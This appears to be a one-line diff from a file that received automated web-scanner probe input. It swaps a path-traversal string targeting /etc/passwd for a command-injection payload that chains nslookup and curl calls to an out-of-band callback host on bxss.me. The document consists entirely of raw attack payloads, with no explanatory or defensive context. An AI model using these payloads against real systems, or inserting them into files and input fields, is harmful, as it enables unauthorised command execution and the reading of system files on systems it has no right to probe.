@@ -1,1 +1,1 @@
-.\\./.\\./.\\./.\\./.\\./.\\./etc/passwd
+;(nslookup -q=cname hitheyfjkldzt024b4.bxss.me||curl hitheyfjkldzt024b4.bxss.me)|(nslookup -q=cname hitheyfjkldzt024b4.bxss.me||curl hitheyfjkldzt024b4.bxss.me)&(nslookup -q=cname hitheyfjkldzt024b4.bxss.me||curl hitheyfjkldzt024b4.bxss.me)
